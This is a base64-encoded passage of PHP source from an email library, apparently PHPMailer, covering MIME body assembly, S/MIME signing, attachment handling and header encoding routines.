ICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEUuJHRoaXMtPkxFOwogICAgfQoKICAgIHJldHVybiAkcmVzdWx0OwogIH0KCiAgLyoqCiAgICogQXNzZW1ibGVzIHRoZSBtZXNzYWdlIGJvZHkuICBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gQ3JlYXRlQm9keSgpIHsKICAgICRyZXN1bHQgPSAnJzsKICAgIGlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAkcmVzdWx0IC49ICR0aGlzLT5HZXRNYWlsTUlNRSgpOwogICAgfQoKICAgICR0aGlzLT5TZXRXb3JkV3JhcCgpOwoKICAgIHN3aXRjaCgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgIGNhc2UgJ2FsdCc6CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+R2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAnJywgJ3RleHQvcGxhaW4nLCAnJyk7CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+RW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFLiR0aGlzLT5MRTsKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5HZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICcnLCAndGV4dC9odG1sJywgJycpOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRS4kdGhpcy0+TEU7CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+RW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICBicmVhazsKICAgICAgY2FzZSAncGxhaW4nOgogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICBicmVhazsKICAgICAgY2FzZSAnYXR0YWNobWVudHMnOgogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJycsICcnLCAnJyk7CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+RW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkF0dGFjaEFsbCgpOwogICAgICAgIGJyZWFrOwogICAgICBjYXNlICdhbHRfYXR0YWNobWVudHMnOgogICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZigiLS0lcyVzIiwgJHRoaXMtPmJvdW5kYXJ5WzFdLCAkdGhpcy0+TEUpOwogICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZigiQ29udGVudC1UeXBlOiAlczslcyIgLiAiXHRib3VuZGFyeT1cIiVzXCIlcyIsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmUnLCAkdGhpcy0+TEUsICR0aGlzLT5ib3VuZGFyeVsyXSwgJHRoaXMtPkxFLiR0aGlzLT5MRSk7CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+R2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAnJywgJ3RleHQvcGxhaW4nLCAnJykgLiAkdGhpcy0+TEU7IC8vIENyZWF0ZSB0ZXh0IGJvZHkKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5FbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICR0aGlzLT5FbmNvZGluZyk7CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEUuJHRoaXMtPkxFOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJycsICd0ZXh0L2h0bWwnLCAnJykgLiAkdGhpcy0+TEU7IC8vIENyZWF0ZSB0aGUgSFRNTCBib2R5CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+RW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFLiR0aGlzLT5MRTsKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5FbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkF0dGFjaEFsbCgpOwogICAgICAgIGJyZWFrOwogICAgfQoKICAgIGlmKCR0aGlzLT5Jc0Vycm9yKCkpIHsKICAgICAgJHJlc3VsdCA9ICcnOwogICAgfSBlbHNlIGlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAkZmlsZSA9IHRlbXBuYW0oIiIsICJtYWlsIik7CiAgICAgICRmcCA9IGZvcGVuKCRmaWxlLCAidyIpOwogICAgICBmd3JpdGUoJGZwLCAkcmVzdWx0KTsKICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICRzaWduZWQgPSB0ZW1wbmFtKCIiLCAic2lnbmVkIik7CgogICAgICBpZiAoQG9wZW5zc2xfcGtjczdfc2lnbigkZmlsZSwgJHNpZ25lZCwgImZpbGU6Ly8iLiR0aGlzLT5zaWduX2tleV9maWxlLCBhcnJheSgiZmlsZTovLyIuJHRoaXMtPnNpZ25fa2V5X2ZpbGUsICR0aGlzLT5zaWduX2tleV9wYXNzKSwgbnVsbCkpIHsKICAgICAgICAkZnAgPSBmb3Blbigkc2lnbmVkLCAiciIpOwogICAgICAgICRyZXN1bHQgPSBmcmVhZCgkZnAsIGZpbGVzaXplKCR0aGlzLT5zaWduX2tleV9maWxlKSk7CiAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJHRoaXMtPlNldEVycm9yKCR0aGlzLT5MYW5nKCJzaWduaW5nIikub3BlbnNzbF9lcnJvcl9zdHJpbmcoKSk7CiAgICAgICAgJHJlc3VsdCA9ICcnOwogICAgICB9CgogICAgICB1bmxpbmsoJGZpbGUpOwogICAgICB1bmxpbmsoJHNpZ25lZCk7CiAgICB9CgogICAgcmV0dXJuICRyZXN1bHQ7CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIHRoZSBzdGFydCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICovCiAgZnVuY3Rpb24gR2V0Qm91bmRhcnkoJGJvdW5kYXJ5LCAkY2hhclNldCwgJGNvbnRlbnRUeXBlLCAkZW5jb2RpbmcpIHsKICAgICRyZXN1bHQgPSAnJzsKICAgIGlmKCRjaGFyU2V0ID09ICcnKSB7CiAgICAgICRjaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7CiAgICB9CiAgICBpZigkY29udGVudFR5cGUgPT0gJycpIHsKICAgICAgJGNvbnRlbnRUeXBlID0gJHRoaXMtPkNvbnRlbnRUeXBlOwogICAgfQogICAgaWYoJGVuY29kaW5nID09ICcnKSB7CiAgICAgICRlbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsKICAgIH0KICAgICRyZXN1bHQgLj0gJHRoaXMtPlRleHRMaW5lKCctLScgLiAkYm91bmRhcnkpOwogICAgJHJlc3VsdCAuPSBzcHJpbnRmKCJDb250ZW50LVR5cGU6ICVzOyBjaGFyc2V0ID0gXCIlc1wiIiwgJGNvbnRlbnRUeXBlLCAkY2hhclNldCk7CiAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsKICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkZW5jb2RpbmcpOwogICAgJHJlc3VsdCAuPSAkdGhpcy0+TEU7CgogICAgcmV0dXJuICRyZXN1bHQ7CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIHRoZSBlbmQgb2YgYSBtZXNzYWdlIGJvdW5kYXJ5LgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqLwogIGZ1bmN0aW9uIEVuZEJvdW5kYXJ5KCRib3VuZGFyeSkgewogICAgcmV0dXJuICR0aGlzLT5MRSAuICctLScgLiAkYm91bmRhcnkgLiAnLS0nIC4gJHRoaXMtPkxFOwogIH0KCiAgLyoqCiAgICogU2V0cyB0aGUgbWVzc2FnZSB0eXBlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIFNldE1lc3NhZ2VUeXBlKCkgewogICAgaWYoY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpIDwgMSAmJiBzdHJsZW4oJHRoaXMtPkFsdEJvZHkpIDwgMSkgewogICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gJ3BsYWluJzsKICAgIH0gZWxzZSB7CiAgICAgIGlmKGNvdW50KCR0aGlzLT5hdHRhY2htZW50KSA+IDApIHsKICAgICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gJ2F0dGFjaG1lbnRzJzsKICAgICAgfQogICAgICBpZihzdHJsZW4oJHRoaXMtPkFsdEJvZHkpID4gMCAmJiBjb3VudCgkdGhpcy0+YXR0YWNobWVudCkgPCAxKSB7CiAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9ICdhbHQnOwogICAgICB9CiAgICAgIGlmKHN0cmxlbigkdGhpcy0+QWx0Qm9keSkgPiAwICYmIGNvdW50KCR0aGlzLT5hdHRhY2htZW50KSA+IDApIHsKICAgICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gJ2FsdF9hdHRhY2htZW50cyc7CiAgICAgIH0KICAgIH0KICB9CgogIC8qIFJldHVybnMgYSBmb3JtYXR0ZWQgaGVhZGVyIGxpbmUuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBIZWFkZXJMaW5lKCRuYW1lLCAkdmFsdWUpIHsKICAgIHJldHVybiAkbmFtZSAuICc6ICcgLiAkdmFsdWUgLiAkdGhpcy0+TEU7CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIGEgZm9ybWF0dGVkIG1haWwgbGluZS4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIFRleHRMaW5lKCR2YWx1ZSkgewogICAgcmV0dXJuICR2YWx1ZSAuICR0aGlzLT5MRTsKICB9CgogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KICAvLyBDTEFTUyBNRVRIT0RTLCBBVFRBQ0hNRU5UUwogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCiAgLyoqCiAgICogQWRkcyBhbiBhdHRhY2htZW50IGZyb20gYSBwYXRoIG9uIHRoZSBmaWxlc3lzdGVtLgogICAqIFJldHVybnMgZmFsc2UgaWYgdGhlIGZpbGUgY291bGQgbm90IGJlIGZvdW5kCiAgICogb3IgYWNjZXNzZWQuCiAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBQYXRoIHRvIHRoZSBhdHRhY2htZW50LgogICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgT3ZlcnJpZGVzIHRoZSBhdHRhY2htZW50IG5hbWUuCiAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuCiAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZS4KICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBBZGRBdHRhY2htZW50KCRwYXRoLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJykgewogICAgaWYoIUBpc19maWxlKCRwYXRoKSkgewogICAgICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2ZpbGVfYWNjZXNzJykgLiAkcGF0aCk7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7CiAgICBpZigkbmFtZSA9PSAnJykgewogICAgICAkbmFtZSA9ICRmaWxlbmFtZTsKICAgIH0KCiAgICAkY3VyID0gY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bMF0gPSAkcGF0aDsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzFdID0gJGZpbGVuYW1lOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bMl0gPSAkbmFtZTsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzNdID0gJGVuY29kaW5nOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bNF0gPSAkdHlwZTsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzVdID0gZmFsc2U7IC8vIGlzU3RyaW5nQXR0YWNobWVudAogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bNl0gPSAnYXR0YWNobWVudCc7CiAgICAkdGhpcy0+YXR0YWNobWVudFskY3VyXVs3XSA9IDA7CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBBdHRhY2hlcyBhbGwgZnMsIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cyB0byB0aGUgbWVzc2FnZS4KICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gQXR0YWNoQWxsKCkgewogICAgLyogUmV0dXJuIHRleHQgb2YgYm9keSAqLwogICAgJG1pbWUgPSBhcnJheSgpOwoKICAgIC8qIEFkZCBhbGwgYXR0YWNobWVudHMgKi8KICAgIGZvcigkaSA9IDA7ICRpIDwgY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpOyAkaSsrKSB7CiAgICAgIC8qIENoZWNrIGZvciBzdHJpbmcgYXR0YWNobWVudCAqLwogICAgICAkYlN0cmluZyA9ICR0aGlzLT5hdHRhY2htZW50WyRpXVs1XTsKICAgICAgaWYgKCRiU3RyaW5nKSB7CiAgICAgICAgJHN0cmluZyA9ICR0aGlzLT5hdHRhY2htZW50WyRpXVswXTsKICAgICAgfSBlbHNlIHsKICAgICAgICAkcGF0aCA9ICR0aGlzLT5hdHRhY2htZW50WyRpXVswXTsKICAgICAgfQoKICAgICAgJGZpbGVuYW1lICAgID0gJHRoaXMtPmF0dGFjaG1lbnRbJGldWzFdOwogICAgICAkbmFtZSAgICAgICAgPSAkdGhpcy0+YXR0YWNobWVudFskaV1bMl07CiAgICAgICRlbmNvZGluZyAgICA9ICR0aGlzLT5hdHRhY2htZW50WyRpXVszXTsKICAgICAgJHR5cGUgICAgICAgID0gJHRoaXMtPmF0dGFjaG1lbnRbJGldWzRdOwogICAgICAkZGlzcG9zaXRpb24gPSAkdGhpcy0+YXR0YWNobWVudFskaV1bNl07CiAgICAgICRjaWQgICAgICAgICA9ICR0aGlzLT5hdHRhY2htZW50WyRpXVs3XTsKCiAgICAgICRtaW1lW10gPSBzcHJpbnRmKCItLSVzJXMiLCAkdGhpcy0+Ym91bmRhcnlbMV0sICR0aGlzLT5MRSk7CiAgICAgICRtaW1lW10gPSBzcHJpbnRmKCJDb250ZW50LVR5cGU6ICVzOyBuYW1lPVwiJXNcIiVzIiwgJHR5cGUsICRuYW1lLCAkdGhpcy0+TEUpOwogICAgICAkbWltZVtdID0gc3ByaW50ZigiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogJXMlcyIsICRlbmNvZGluZywgJHRoaXMtPkxFKTsKCiAgICAgIGlmKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJykgewogICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCJDb250ZW50LUlEOiA8JXM+JXMiLCAkY2lkLCAkdGhpcy0+TEUpOwogICAgICB9CgogICAgICAkbWltZVtdID0gc3ByaW50ZigiQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPVwiJXNcIiVzIiwgJGRpc3Bvc2l0aW9uLCAkbmFtZSwgJHRoaXMtPkxFLiR0aGlzLT5MRSk7CgogICAgICAvKiBFbmNvZGUgYXMgc3RyaW5nIGF0dGFjaG1lbnQgKi8KICAgICAgaWYoJGJTdHJpbmcpIHsKICAgICAgICAkbWltZVtdID0gJHRoaXMtPkVuY29kZVN0cmluZygkc3RyaW5nLCAkZW5jb2RpbmcpOwogICAgICAgIGlmKCR0aGlzLT5Jc0Vycm9yKCkpIHsKICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRS4kdGhpcy0+TEU7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5FbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcpOwogICAgICAgIGlmKCR0aGlzLT5Jc0Vycm9yKCkpIHsKICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRS4kdGhpcy0+TEU7CiAgICAgIH0KICAgIH0KCiAgICAkbWltZVtdID0gc3ByaW50ZigiLS0lcy0tJXMiLCAkdGhpcy0+Ym91bmRhcnlbMV0sICR0aGlzLT5MRSk7CgogICAgcmV0dXJuIGpvaW4oJycsICRtaW1lKTsKICB9CgogIC8qKgogICAqIEVuY29kZXMgYXR0YWNobWVudCBpbiByZXF1ZXN0ZWQgZm9ybWF0LiAgUmV0dXJucyBhbgogICAqIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gRW5jb2RlRmlsZSAoJHBhdGgsICRlbmNvZGluZyA9ICdiYXNlNjQnKSB7CiAgICBpZighQCRmZCA9IGZvcGVuKCRwYXRoLCAncmInKSkgewogICAgICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2ZpbGVfb3BlbicpIC4gJHBhdGgpOwogICAgICByZXR1cm4gJyc7CiAgICB9CiAgICAkbWFnaWNfcXVvdGVzID0gZ2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCk7CiAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7CiAgICAkZmlsZV9idWZmZXIgPSBmcmVhZCgkZmQsIGZpbGVzaXplKCRwYXRoKSk7CiAgICAkZmlsZV9idWZmZXIgPSAkdGhpcy0+RW5jb2RlU3RyaW5nKCRmaWxlX2J1ZmZlciwgJGVuY29kaW5nKTsKICAgIGZjbG9zZSgkZmQpOwogICAgc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCRtYWdpY19xdW90ZXMpOwoKICAgIHJldHVybiAkZmlsZV9idWZmZXI7CiAgfQoKICAvKioKICAgKiBFbmNvZGVzIHN0cmluZyB0byByZXF1ZXN0ZWQgZm9ybWF0LiBSZXR1cm5zIGFuCiAgICogZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBFbmNvZGVTdHJpbmcgKCRzdHIsICRlbmNvZGluZyA9ICdiYXNlNjQnKSB7CiAgICAkZW5jb2RlZCA9ICcnOwogICAgc3dpdGNoKHN0cnRvbG93ZXIoJGVuY29kaW5nKSkgewogICAgICBjYXNlICdiYXNlNjQnOgogICAgICAgIC8qIGNodW5rX3NwbGl0IGlzIGZvdW5kIGluIFBIUCA+PSAzLjAuNiAqLwogICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZSgkc3RyKSwgNzYsICR0aGlzLT5MRSk7CiAgICAgICAgYnJlYWs7CiAgICAgIGNhc2UgJzdiaXQnOgogICAgICBjYXNlICc4Yml0JzoKICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5GaXhFT0woJHN0cik7CiAgICAgICAgaWYgKHN1YnN0cigkZW5jb2RlZCwgLShzdHJsZW4oJHRoaXMtPkxFKSkpICE9ICR0aGlzLT5MRSkKICAgICAgICAgICRlbmNvZGVkIC49ICR0aGlzLT5MRTsKICAgICAgICBicmVhazsKICAgICAgY2FzZSAnYmluYXJ5JzoKICAgICAgICAkZW5jb2RlZCA9ICRzdHI7CiAgICAgICAgYnJlYWs7CiAgICAgIGNhc2UgJ3F1b3RlZC1wcmludGFibGUnOgogICAgICAgICRlbmNvZGVkID0gJHRoaXMtPkVuY29kZVFQKCRzdHIpOwogICAgICAgIGJyZWFrOwogICAgICBkZWZhdWx0OgogICAgICAgICR0aGlzLT5TZXRFcnJvcigkdGhpcy0+TGFuZygnZW5jb2RpbmcnKSAuICRlbmNvZGluZyk7CiAgICAgICAgYnJlYWs7CiAgICB9CiAgICByZXR1cm4gJGVuY29kZWQ7CiAgfQoKICAvKioKICAgKiBFbmNvZGUgYSBoZWFkZXIgc3RyaW5nIHRvIGJlc3Qgb2YgUSwgQiwgcXVvdGVkIG9yIG5vbmUuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBFbmNvZGVIZWFkZXIgKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0JykgewogICAgJHggPSAwOwoKICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7CiAgICAgIGNhc2UgJ3BocmFzZSc6CiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvW1wyMDAtXDM3N10vJywgJHN0cikpIHsKICAgICAgICAgIC8qIENhbid0IHVzZSBhZGRzbGFzaGVzIGFzIHdlIGRvbid0IGtub3cgd2hhdCB2YWx1ZSBoYXMgbWFnaWNfcXVvdGVzX3N5YmFzZS4gKi8KICAgICAgICAgICRlbmNvZGVkID0gYWRkY3NsYXNoZXMoJHN0ciwgIlwwLi5cMzdcMTc3XFxcIiIpOwogICAgICAgICAgaWYgKCgkc3RyID09ICRlbmNvZGVkKSAmJiAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsKICAgICAgICAgICAgcmV0dXJuICgkZW5jb2RlZCk7CiAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gKCJcIiRlbmNvZGVkXCIiKTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHggPSBwcmVnX21hdGNoX2FsbCgnL1teXDA0MFwwNDFcMDQzLVwxMzNcMTM1LVwxNzZdLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICBicmVhazsKICAgICAgY2FzZSAnY29tbWVudCc6CiAgICAgICAgJHggPSBwcmVnX21hdGNoX2FsbCgnL1soKSJdLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAvKiBGYWxsLXRocm91Z2ggKi8KICAgICAgY2FzZSAndGV4dCc6CiAgICAgIGRlZmF1bHQ6CiAgICAgICAgJHggKz0gcHJlZ19tYXRjaF9hbGwoJy9bXDAwMC1cMDEwXDAxM1wwMTRcMDE2LVwwMzdcMTc3LVwzNzddLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICBicmVhazsKICAgIH0KCiAgICBpZiAoJHggPT0gMCkgewogICAgICByZXR1cm4gKCRzdHIpOwogICAgfQoKICAgICRtYXhsZW4gPSA3NSAtIDcgLSBzdHJsZW4oJHRoaXMtPkNoYXJTZXQpOwogICAgLyogVHJ5IHRvIHNlbGVjdCB0aGUgZW5jb2Rpbmcgd2hpY2ggc2hvdWxkIHByb2R1Y2UgdGhlIHNob3J0ZXN0IG91dHB1dCAqLwogICAgaWYgKHN0cmxlbigkc3RyKS8zIDwgJHgpIHsKICAgICAgJGVuY29kaW5nID0gJ0InOwogICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSAmJiAkdGhpcy0+SGFzTXVsdGlCeXRlcygkc3RyKSkgewogICAgIC8vIFVzZSBhIGN1c3RvbSBmdW5jdGlvbiB3aGljaCBjb3JyZWN0bHkgZW5jb2RlcyBhbmQgd3JhcHMgbG9uZwogICAgIC8vIG11bHRpYnl0ZSBzdHJpbmdzIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyCiAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+QmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIpOwogICAgICB9IGVsc2UgewogICAgICAgICRlbmNvZGVkID0gYmFzZTY0X2VuY29kZSgkc3RyKTsKICAgICAgICAkbWF4bGVuIC09ICRtYXhsZW4gJSA0OwogICAgICAgICRlbmNvZGVkID0gdHJpbShjaHVua19zcGxpdCgkZW5jb2RlZCwgJG1heGxlbiwgIlxuIikpOwogICAgICB9CiAgICB9IGVsc2UgewogICAgICAkZW5jb2RpbmcgPSAnUSc7CiAgICAgICRlbmNvZGVkID0gJHRoaXMtPkVuY29kZVEoJHN0ciwgJHBvc2l0aW9uKTsKICAgICAgJGVuY29kZWQgPSAkdGhpcy0+V3JhcFRleHQoJGVuY29kZWQsICRtYXhsZW4sIHRydWUpOwogICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCc9Jy4kdGhpcy0+TEUsICJcbiIsIHRyaW0oJGVuY29kZWQpKTsKICAgIH0KCiAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnL14oLiopJC9tJywgIiA9PyIuJHRoaXMtPkNoYXJTZXQuIj8kZW5jb2Rpbmc/XFwxPz0iLCAkZW5jb2RlZCk7CiAgICAkZW5jb2RlZCA9IHRyaW0oc3RyX3JlcGxhY2UoIlxuIiwgJHRoaXMtPkxFLCAkZW5jb2RlZCkpOwoKICAgIHJldHVybiAkZW5jb2RlZDsKICB9CgogIC8qKgogICAqIENoZWNrcyBpZiBhIHN0cmluZyBjb250YWlucyBtdWx0aWJ5dGUgY2hhcmFjdGVycy4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlCiAgICogQHJldHVybiBib29sCiAgICovCiAgZnVuY3Rpb24gSGFzTXVsdGlCeXRlcygkc3RyKSB7CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSkgewogICAgICByZXR1cm4gKHN0cmxlbigkc3RyKSA+IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCkpOwogICAgfSBlbHNlIHsgLy8gQXNzdW1lIG5vIG11bHRpYnl0ZXMgKHdlIGNhbid0IGhhbmRsZSB3aXRob3V0IG1ic3RyaW5nIGZ1bmN0aW9ucyBhbnl3YXkpCiAgICAgIHJldHVybiBGYWxzZTsKICAgIH0KICB9CgogIC8qKgogICAqIENvcnJlY3RseSBlbmNvZGVzIGFuZCB3cmFwcyBsb25nIG11bHRpYnl0ZSBzdHJpbmdzIGZvciBtYWlsIGhlYWRlcnMKICAgKiB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3Rlci4KICAgKiBBZGFwdGVkIGZyb20gYSBmdW5jdGlvbiBieSBwYXJhdm9pZCBhdCBodHRwOi8vdWsucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWItZW5jb2RlLW1pbWVoZWFkZXIucGhwCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHBhcmFtIHN0cmluZyAkc3RyIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFwIGVuY29kZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gQmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIpIHsKICAgICRzdGFydCA9ICI9PyIuJHRoaXMtPkNoYXJTZXQuIj9CPyI7CiAgICAkZW5kID0gIj89IjsKICAgICRlbmNvZGVkID0gIiI7CgogICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7CiAgICAvLyBFYWNoIGxpbmUgbXVzdCBoYXZlIGxlbmd0aCA8PSA3NSwgaW5jbHVkaW5nICRzdGFydCBhbmQgJGVuZAogICAgJGxlbmd0aCA9IDc1IC0gc3RybGVuKCRzdGFydCkgLSBzdHJsZW4oJGVuZCk7CiAgICAvLyBBdmVyYWdlIG11bHRpLWJ5dGUgcmF0aW8KICAgICRyYXRpbyA9ICRtYl9sZW5ndGggLyBzdHJsZW4oJHN0cik7CiAgICAvLyBCYXNlNjQgaGF